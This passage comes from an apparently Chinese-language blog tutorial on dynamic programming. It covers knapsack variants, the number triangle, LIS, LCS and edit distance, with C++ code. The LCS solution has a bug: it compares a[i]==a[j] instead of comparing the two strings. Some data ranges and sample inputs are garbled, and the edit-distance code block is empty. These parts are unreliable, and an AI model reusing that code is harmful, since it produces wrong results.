class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1010</span>;<br><span class="hljs-type">int</span> n,m;<br><span class="hljs-type">int</span> v[N],w[N];<br><span class="hljs-type">int</span> f[N][N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>cin&gt;&gt;n&gt;&gt;m;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<br>cin&gt;&gt;v[i]&gt;&gt;w[i];<br>&#125;<br><span class="hljs-comment">//f[0][0~m]=0</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=m;j++)&#123;<br>f[i][j]=f[i<span class="hljs-number">-1</span>][j];<br><span class="hljs-keyword">if</span>(j&gt;=v[i])&#123;<br>f[i][j]=<span class="hljs-built_in">max</span>(f[i][j],f[i<span class="hljs-number">-1</span>][j-v[i]]+w[i]);<br>&#125;<br>&#125;<br>&#125;<br><br>cout&lt;&lt;f[n][m]&lt;&lt;endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>一维写法：</p><p>f[i][j]在对f[i-1][j]从左向右滚动更新，改成一维的话如果任采用从左向右的遍历方式f[i-1][j-v[i]]则是f[i][j-v[i]]，因为f[j-v[i]]已经遍历成i层的结果了，故j从m开始遍历</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1010</span>;<br><br><span class="hljs-type">int</span> f[N];<br><span class="hljs-type">int</span> v[N],w[N];<br><span class="hljs-type">int</span> n,m;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>cin&gt;&gt;n&gt;&gt;m;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cin&gt;&gt;v[i]&gt;&gt;w[i];<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=m;j&gt;=v[i];j--)<br>f[j]=<span class="hljs-built_in">max</span>(f[j],f[j-v[i]]+w[i]);<br><br>cout&lt;&lt;f[m]&lt;&lt;endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-完全背包问题"><a href="#2-完全背包问题" class="headerlink" title="2.完全背包问题"></a>2.完全背包问题</h3><p>每个物品无限个</p><p>完全背包问题一般是指：有N件物品和一个能背重量为W的背包，第i件物品的重量为weight[i],价值为value[i]。每件物品有无限个(也就是可以放入背包多次），求怎样可以使背包物品价值总量最大。</p><p>完全背包与01背包问题的区别在于01背包物品只有一个，完全背包有无数个。</p><p>题目：</p><p><strong>题目描述：</strong></p><p>有 N 种物品和一个容量是 V 的背包，每种物品都有无限件可用。第 i 种物品的体积是 vi，价值是 wi。求解将哪些物品装入背包，可使这些物品的总体积不超过背包容量，且总价值最大。输出最大价值。</p><p>输入输出格式：</p><p><strong>输入</strong></p><p>第一行两个整数，N，V，用空格隔开，分别表示物品种数和背包容积。接下来有 N 行，每行两个整数 vi,wi，用空格隔开，分别表示第 i 种物品的体积和价值。</p><p><strong>输出</strong></p><p>输出一个整数，表示最大价值。</p><p><strong>输入输出样例：</strong></p><p>输入</p><p>4 5<br>1 2<br>2 4<br>3 4<br>4 5</p><p>输出</p><p>10</p><p>朴素版</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1010</span>;<br><br><span class="hljs-type">int</span> v[N],w[N];<br><span class="hljs-type">int</span> f[N][N];<br><span class="hljs-type">int</span> n,m;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>cin&gt;&gt;n&gt;&gt;m;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cin&gt;&gt;v[i]&gt;&gt;w[i];<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=v[i];j&lt;=m;j++)<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k*v[i]&lt;=j;k++)&#123;<br>f[i][j]=<span class="hljs-built_in">max</span>(f[i][j],f[i<span class="hljs-number">-1</span>][j-k*v[i]]+k*w[i]);<br><br>&#125;<br><br>cout&lt;&lt;f[n][m]&lt;&lt;endl;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>优化1：三层循环变两层循环</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202303142225509.png" alt="image-20230314222502364"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1010</span>;<br><span class="hljs-type">int</span> n,m;<br><span class="hljs-type">int</span> v[N],w[N];<br><span class="hljs-type">int</span> f[N][N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>cin&gt;&gt;n&gt;&gt;m;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<br>cin&gt;&gt;v[i]&gt;&gt;w[i];<br>&#125;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=m;j++)&#123;<br>f[i][j]=f[i<span class="hljs-number">-1</span>][j];<br><span class="hljs-keyword">if</span>(j&gt;=v[i])&#123;<br>f[i][j]=<span class="hljs-built_in">max</span>(f[i][j],f[i][j-v[i]]+w[i]);<br>&#125;<br>&#125;<br>&#125;<br><br>cout&lt;&lt;f[n][m]&lt;&lt;endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>优化2（究极写法：用一维数组描述状态</p><p>思想同01背包降维，但是从v[i]开始遍历</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1010</span>;<br><br><span class="hljs-type">int</span> f[N];<br><span class="hljs-type">int</span> v[N],w[N];<br><span class="hljs-type">int</span> n,m;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>cin&gt;&gt;n&gt;&gt;m;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cin&gt;&gt;v[i]&gt;&gt;w[i];<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=v[i];j&lt;=m;j++)<br>f[j]=<span class="hljs-built_in">max</span>(f[j],f[j-v[i]]+w[i]);<br><br>cout&lt;&lt;f[m]&lt;&lt;endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-多重背包问题"><a href="#3-多重背包问题" class="headerlink" title="3.多重背包问题"></a>3.多重背包问题</h3><p>每个物品有限个</p><p><strong>题目：</strong></p><p>有 N 种物品和一个容量是 V 的背包。</p><p>第 i 种物品最多有 si件，每件体积是 vi，价值是 wi。</p><p>求解将哪些物品装入背包，可使物品体积总和不超过背包容量，且价值总和最大。<br>输出最大价值。</p><p><strong>输入格式</strong></p><p>第一行两个整数N ,V用空格隔开，分别表示物品种数和背包容积。</p><p>接下来有 N 行，每行三个整数 vi,wi,si，用空格隔开，分别表示第 i 种物品的体积、价值和数量。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示最大价值。</p><p><strong>数据范围</strong></p><p>0&lt;N,V≤1000&lt;N,V≤100<br>0&lt;vi,wi,si≤100</p><p><strong>输入样例</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">4 </span><span class="hljs-number">5</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">3</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">4</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">4</span> <span class="hljs-number">3</span><br><span class="hljs-symbol">4 </span><span class="hljs-number">5</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><strong>输出样例</strong>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">10<br></code></pre></td></tr></table></figure><h3 id="4-分组背包问题"><a href="#4-分组背包问题" class="headerlink" title="4.分组背包问题"></a>4.分组背包问题</h3><p>每一组中最多选一个</p><p>有 N 组物品和一个容量是 V 的背包。</p><p>每组物品有若干个，同一组内的物品最多只能选一个。<br>每件物品的体积是 vij，价值是 wij，其中 ii是组号，j 是组内编号。</p><p>求解将哪些物品装入背包，可使物品总体积不超过背包容量，且总价值最大。</p><p>输出最大价值。</p><p><strong>输入格式</strong></p><p>第一行有两个整数 N，V，用空格隔开，分别表示物品组数和背包容量。</p><p>接下来有 N 组数据：</p><ul><li>每组数据第一行有一个整数 Si，表示第 i个物品组的物品数量；</li><li>每组数据接下来有 Si 行，每行有两个整数 vij,wij，用空格隔开，分别表示第 i 个物品组的第 j个物品的体积和价值；</li></ul><p><strong>输出格式</strong></p><p>输出一个整数，表示最大价值。</p><p><strong>数据范围</strong></p><p>0&lt;N,V≤100<br>0&lt;Si≤100<br>0&lt;vij,wij≤100</p><p><strong>输入样例</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">3 </span><span class="hljs-number">5</span><br><span class="hljs-number">2</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">4</span><br><span class="hljs-number">1</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">4</span><br><span class="hljs-number">1</span><br><span class="hljs-symbol">4 </span><span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p><strong>输出样例</strong>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">8<br></code></pre></td></tr></table></figure><h1 id="动态规划-二"><a href="#动态规划-二" class="headerlink" title="动态规划(二)"></a>动态规划(二)</h1><h2 id="线性DP"><a href="#线性DP" class="headerlink" title="线性DP"></a>线性DP</h2><h3 id="数字三角形"><a href="#数字三角形" class="headerlink" title="数字三角形"></a>数字三角形</h3><p>给定一个如下图所示的数字三角形，从顶部出发，在每一结点可以选择移动至其左下方的结点或移动至其右下方的结点，一直走到底层，要求找出一条路径，使路径上的数字的和最大。</p><pre><code class="hljs">        7      3   8    8   1   0  2   7   4   44   5   2   6   5</code></pre><p><strong>输入格式</strong></p><p>第一行包含整数 n，表示数字三角形的层数。</p><p>接下来 n 行，每行包含若干整数，其中第 i 行表示数字三角形第 i 层包含的整数。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示最大的路径数字和。</p><p><strong>数据范围</strong></p><p>1≤n≤500,<br>−10000≤三角形中的整数≤10000</p><p><strong>输入样例</strong>：</p><p>5<br>7<br>3 8<br>8 1 0<br>2 7 4 4<br>4 5 2 6 5<br><strong>输出样例</strong>：</p><p>30</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">510</span>,INF=<span class="hljs-number">1e9</span>;<br><br><span class="hljs-type">int</span> a[N][N];<br><span class="hljs-type">int</span> f[N][N];<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>cin&gt;&gt;n;<br><br><span class="hljs-comment">//输入数字三角形</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=i;j++)<br>cin&gt;&gt;a[i][j];<br><br><span class="hljs-comment">//初始化f[N][N]为负无穷 注意从0开始，j的遍历到i+1结束</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=n;i++)<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=i+<span class="hljs-number">1</span>;j++)<br>f[i][j]=-INF;<br><br><span class="hljs-comment">//起点</span><br>f[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]=a[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//开始维护f，即dp</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=i;j++)<br>f[i][j]=<span class="hljs-built_in">max</span>(f[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>]+a[i][j],f[i<span class="hljs-number">-1</span>][j]+a[i][j]);<br><br><span class="hljs-type">int</span> res=-INF;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) res=<span class="hljs-built_in">max</span>(res,f[n][i]);<br><br>cout&lt;&lt;res&lt;&lt;endl;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="最长上升子序列Ⅰ"><a href="#最长上升子序列Ⅰ" class="headerlink" title="最长上升子序列Ⅰ"></a>最长上升子序列Ⅰ</h3><p>给定一个长度为 N 的数列，求数值严格单调递增的子序列的长度最长是多少。</p><p><strong>输入格式</strong></p><p>第一行包含整数 N。</p><p>第二行包含 N 个整数，表示完整序列。</p><p>输出格式</p><p>输出一个整数，表示最大长度。</p><p><strong>数据范围</strong></p><p>1≤N≤1000，<br>−109≤数列中的数≤109</p><p><strong>输入样例</strong>：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">7</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span> <span class="hljs-number">8</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p><strong>输出样例</strong>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">4<br></code></pre></td></tr></table></figure><p><strong>代码：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1010</span>;<br><br><span class="hljs-type">int</span> a[N];<br><span class="hljs-type">int</span> f[N];<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>cin&gt;&gt;n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>cin&gt;&gt;a[i];<br><br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>&#123;<br>f[i]=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;i;j++)<br>&#123;<br><span class="hljs-keyword">if</span>(a[i]&gt;a[j]) f[i]=<span class="hljs-built_in">max</span>(f[i],f[j]+<span class="hljs-number">1</span>);<br>&#125;<br>&#125;<br><span class="hljs-type">int</span> res=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) res=<span class="hljs-built_in">max</span>(res,f[i]);<br><br>cout&lt;&lt;res&lt;&lt;endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="最长上升子序列Ⅱ"><a href="#最长上升子序列Ⅱ" class="headerlink" title="最长上升子序列Ⅱ"></a>最长上升子序列Ⅱ</h3><p><img src="https://www.freesion.com/images/51/338d1d0a54d6dc3be8574c6744185acb.png" alt="在这里插入图片描述"></p><h3 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h3><p><strong>题目描述</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">给定两个长度分别为N和M的字符串<span class="hljs-selector-tag">A</span>和<span class="hljs-selector-tag">B</span>，<br>求既是<span class="hljs-selector-tag">A</span>的子序列又是<span class="hljs-selector-tag">B</span>的子序列的字符串长度最长是多少。<br></code></pre></td></tr></table></figure><p><strong>输入格式</strong></p><p>第一行包含两个整数N和M。</p><p>第二行包含一个长度为N的字符串，表示字符串A。</p><p>第三行包含一个长度为M的字符串，表示字符串B。</p><p>字符串均由小写字母构成。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示最大长度。</p><p><strong>数据范围</strong></p><p>1≤N,M≤10001≤N,M≤1000</p><p><strong>输入样例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs undefined">4 5<br>acbd<br>abedc<br></code></pre></td></tr></table></figure><p><strong>输出样例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined">3<br></code></pre></td></tr></table></figure><p><strong>代码：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1010</span>;<br><br><span class="hljs-type">char</span> a[N],b[N];<br><span class="hljs-type">int</span> f[N][N];<br><span class="hljs-type">int</span> n,m;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s%s&quot;</span>,a+<span class="hljs-number">1</span>,b+<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)<br>&#123;<br>f[i][j]=<span class="hljs-built_in">max</span>(f[i<span class="hljs-number">-1</span>][j],f[i][j<span class="hljs-number">-1</span>]);<br><span class="hljs-keyword">if</span>(a[i]==a[j]) f[i][j]=<span class="hljs-built_in">max</span>(f[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>]+<span class="hljs-number">1</span>,f[i][j]);<br>&#125;<br><br>cout&lt;&lt;f[n][m]&lt;&lt;endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="编辑距离"><a href="#编辑距离" class="headerlink" title="编辑距离"></a>编辑距离</h3><p>给定n 个长度不超过10 的字符串和m 次询问，每次询问含一个字符串和一个操作次数m ，问这n 个字符串里有多少个可以通过不超过m 次操作变成询问的那个字符串。单个字符的插入、删除或替换算一次操作。</p><p><strong>输入格式</strong>：<br>第一行包含两个整数n 和m 。接下来n 行，每行包含一个字符串，表示给定的字符串。再接下来m 行，每行包含一个字符串和一个整数，表示一次询问。字符串中只包含小写字母，且长度均不超过10 。</p><p><strong>输出格式</strong>：<br>输出共m 行，每行输出一个整数作为结果，表示一次询问中满足条件的字符串个数。</p><p><strong>数据范围</strong>：<br>1 ≤ n , m ≤ 1000<br><strong>输入样例</strong>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">abc</span><br><span class="hljs-attribute">bcd</span><br><span class="hljs-attribute">ab</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">acbd</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>输出样例</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">1<br>3<br></code></pre></td></tr></table></figure><p><strong>代码</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br></code></pre></td></tr></table></figure><h2 id="区间DP"><a 